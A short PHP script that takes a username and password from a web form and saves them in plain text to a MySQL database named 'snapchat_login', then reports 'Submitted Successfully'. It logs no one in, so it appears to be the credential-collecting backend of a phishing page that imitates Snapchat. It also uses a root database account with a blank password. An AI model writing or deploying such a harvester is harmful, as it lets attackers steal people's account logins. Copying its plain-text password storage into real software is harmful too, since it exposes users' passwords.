<?php
// MySQL connection config
$servername = "localhost";
$dbUsername = "root";    // XAMPP default
$dbPassword = "";        // Leave blank in XAMPP
$dbName     = "snapchat_login";

// Connect to MySQL
$conn = new mysqli($servername, $dbUsername, $dbPassword, $dbName);

// Check connection
if ($conn->connect_error) {
    die("❌ Connection failed: " . $conn->connect_error);
}

// Get form input safely
$username = trim($_POST['username'] ?? '');
$password = trim($_POST['password'] ?? '');

// Check inputs are not empty
if ($username && $password) {
    // Prepare SQL with timestamp
    $stmt = $conn->prepare("INSERT INTO users (username, password, created_at) VALUES (?, ?, NOW())");
    $stmt->bind_param("ss", $username, $password);

    // Execute and confirm
    if ($stmt->execute()) {
        echo "<h3>✅ Submitted Successfully!</h3>";
    } else {
        echo "<h3>❌ Error saving data.</h3>";
    }

    $stmt->close();
} else {
    echo "<h3>⚠ Please enter both username and password.</h3>";
}

$conn->close();
?>
